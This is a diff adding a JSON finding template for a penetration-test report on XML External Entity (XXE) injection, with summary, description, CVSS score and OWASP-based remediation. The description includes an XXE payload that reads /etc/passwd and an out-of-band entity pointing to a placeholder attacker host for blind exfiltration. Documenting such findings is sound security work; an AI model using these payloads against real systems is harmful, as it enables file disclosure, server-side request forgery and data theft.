@@ -1,0 +1,40 @@
+﻿{
+    "id":  "53471763-99c6-46e3-8c4f-858cfe6c09d2",
+    "created":  "2026-09-16T17:16:54.870815Z",
+    "updated":  "2026-10-23T16:53:16.127563Z",
+    "details":  "http://localhost:8000/api/v1/findingtemplates/53471763-99c6-46e3-8c4f-858cfe6c09d2",
+    "images":  "http://localhost:8000/api/v1/findingtemplates/53471763-99c6-46e3-8c4f-858cfe6c09d2/images",
+    "usage_count":  0,
+    "source":  "imported",
+    "tags":  [
+                 "web"
+             ],
+    "translations":  [
+                         {
+                             "id":  "3c61ab3d-93cd-4aed-b8f1-88aa7335828b",
+                             "created":  "2026-09-16T17:16:54.874718Z",
+                             "updated":  "2026-09-16T17:16:54.880240Z",
+                             "language":  "en-US",
+                             "status":  "finished",
+                             "is_main":  true,
+                             "risk_score":  7.5,
+                             "risk_level":  "high",
+                             "data":  {
+                                          "title":  "XML External Entity Injection (XXE)",
+                                          "cvss":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                                          "summary":  "The web application processed XML documents in an insecure manner, which made it vulnerable to XML External Entity (XXE) Injection attacks. \nXXE Injection is a vulnerability in web applications that allows an attacker to interfere with the processing of XML documents by an XML parser. \nThis attack can lead to disclosure of confidential data, denial of service, server-side request forgery, and other severe impact on the underlying system or other backend systems.\n",
+                                          "description":  "We identified an XXE injection vulnerability in the web application. \nThe XML parser allowed the definition of XXEs, which could create a malicious XML document. \nThe XXE contained a URL that referenced an external domain. \nAfter the XXE was dereferenced by the parser, the web application interacted with this domain, which is evident from the DNS requests.\n\nThe endpoint `\u003cURL\u003e` accepts XML in the parameter `\u003cPARAMETER_NAME\u003e` and parses it with external entity resolution enabled. We sent a document with an internal DTD that declares a `SYSTEM` entity and references it in a field the application reflects:\n\n```xml\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE foo [ \u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e ]\u003e\n\u003croot\u003e\u003c\u003cFIELD_NAME\u003e\u003e\u0026xxe;\u003c/\u003cFIELD_NAME\u003e\u003e\u003c/root\u003e\n```\n\nThe response contained the contents of `/etc/passwd`, so the parser reads local files with the privileges of the web application process. Where the response does not reflect entity content, an out-of-band entity (`\u003c!ENTITY % ext SYSTEM \"http://\u003cATTACKER_HOST\u003e/x.dtd\"\u003e`) caused the server to resolve our DNS name and request the DTD, which allows blind exfiltration.\n\nBecause the parser also dereferences `http://` URIs, the same flaw lets an attacker send requests from the server to internal hosts and cloud metadata services (SSRF). Entity expansion attacks such as \"billion laughs\" can exhaust memory and cause a denial of service.\n\nExtensible Markup Language (XML) is a standardized markup language and file format for storing, transmitting, and reconstructing arbitrary data. \nThe language encodes data in a format that is readable by both humans and machines. \nThe structure of an XML document is defined in the XML standard. \nThe standard provides for a concept called an entity. \nEntities provide the ability to reference content that is provided remotely by a server or resides locally on the server. \nWhen the XML parser evaluates the XML document, the entity it contains is replaced with the referenced value. \nEntities are defined in so-called Document Type Definitions (DTDs).\n\nDTDs define the structure and composition of an XML document. \nThey can either be completely contained in the XML document itself, so-called internal DTDs, or they can be loaded from another location, so-called external DTDs. \nA combination of both variants is also possible. \nXML External Entities (XXE) are a special form of XML entities whose contents are loaded from outside the DTD in which they are declared. \n\nAn XXE is declared in the DTD with the SYSTEM keyword and a URI from where the content should be loaded. \nFor example:\n\n`\u003c!DOCTYPE dtd [ \u003c!ENTITY xxe SYSTEM \"http://syslifters.com\" \u003e ]\u003e`\n\nThe URI can also use the `file://` protocol scheme. \nContent can be loaded from local files as a result. \nFor example:\n\n`\u003c!DOCTYPE dtd [ \u003c!ENTITY xxe SYSTEM \"file:///path/to/local/file\" \u003e ]\u003e`\n\nWhen evaluating XML documents, the XML parser replaces occurring XXEs with the contents by dereferencing the defined URIs. \nIf the URI contains manipulated data, this could have serious consequences. \nAn attacker can exploit this to perform server-side request forgery (SSRF) attacks and compromise the underlying server or other backend infrastructure. \nXXE injection vulnerabilities can also be exploited to cause service/application downtime (denial of service) or expose sensitive data such as local system files.\n",
+                                          "recommendation":  "* The XML parser should be configured to use a local static DTD and not allow external DTDs declared in the XML document.\n* We recommend limiting the functions of the XML parsing library to the minimum needed (see the documentation of the library used).\n* User input should be validated before parsing if possible.\n* Detailed information and help on preventing XXE injections can be found in the linked XML External Entity Prevention Cheat Sheet from OWASP.\n",
+                                          "short_recommendation":  "Disable support for external DTDs in the XML parsing library.",
+                                          "references":  [
+                                                             "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
+                                                         ],
+                                          "affected_components":  [
+                                                                      "\u003cURL\u003e - parameter: \u003cPARAMETER_NAME\u003e"
+                                                                  ]
+                                      }
+                         }
+                     ],
+    "lock_info":  null,
+    "copy_of":  null
+}
